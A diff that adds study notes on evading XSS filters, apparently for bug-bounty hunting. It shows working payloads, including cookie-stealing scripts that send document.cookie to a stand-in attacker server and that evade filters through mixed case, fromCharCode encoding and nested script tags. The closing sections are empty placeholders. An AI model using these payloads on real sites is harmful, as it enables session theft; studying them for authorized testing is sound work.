@@ -334,3 +334,70 @@ Your payload could be used to construct other things in the future such as web p
 Sometimes a payload is triggered only during specific conditions such as an admin being logged in or a user interacts with specific HTML elements. 
 Confirm the impact of the XSS payload by browsing the necessary pages and performing those actions. 
 ## Bypassing XSS Protection
+Most apps include XSS protection in their input fields, they'll use a blocklist to filter out dangerous expressions that could pose an XSS vulnerability. 
+#### Alternative Javascript Syntax
+`<script>` tags are often sanitized in user input, if so try executing XSS that doesn't include us using a script tag. 
+In some cases you can specify javascript to run in other types of tags.
+You can also try to insert code into HTML tag names or attributes. 
+
+```html
+<img src="USER_INPUT">
+<img src="/><script>alert('XSS by Vickie');</script>"/>
+```
+
+Closing out the image tag and inserting a script tag to execute code passed into the `src` attribute.
+
+```html
+<img src="123" onerror="alert('XSS By Drew');" />
+```
+
+You can just insert code directly into an attribute.
+
+```html
+<a href="javascript:alert('XSS by Vickie')>Click me!</a>"
+```
+
+This click me link will generate an alert box when clicked. 
+#### Capitalization And Encoding
+You can mix different encodings and capitalizations to confuse the XSS filter.
+If a filter is looking out for the "script" string, try to capitalize some of the letters in the payload.
+
+```html
+<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
+```
+
+If the app filters characters like single and double quotes you cant write any strings into your payload directly, try and use the `fromCharCode()` function to create the string you need. 
+
+```html
+<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
+47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
+101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
+```
+
+The function returns a string, given an input lost of ASCII character codes. 
+#### Filter Logic Errors
+Exploiting errors in the filter logic, some times they remove all `<script>` tags from the input to prevent XSS but it only does that once.
+
+```html
+<scrip<script>t>
+location='http://attacker_server_ip/c='+document.cookie;
+</scrip</script>t>
+```
+
+Each `<script>` tag cuts another `<script>` tag in half, the filter wont recognize them as legitimate tags but once the filter removes the intact tags from the payload the rendered input becomes a valid piece of javascript code. 
+
+```html
+<script>location='http://attacker_server_ip/c='+document.cookie;</script>
+```
+
+check out OWASP’s XSS filter evasion cheat sheet
+## Escalating The Attack
+## Automating XSS Hunting
+## Finding Your First XSS
+1. a
+2. a
+3. a
+4. a
+5. a
+6. a
+7. a
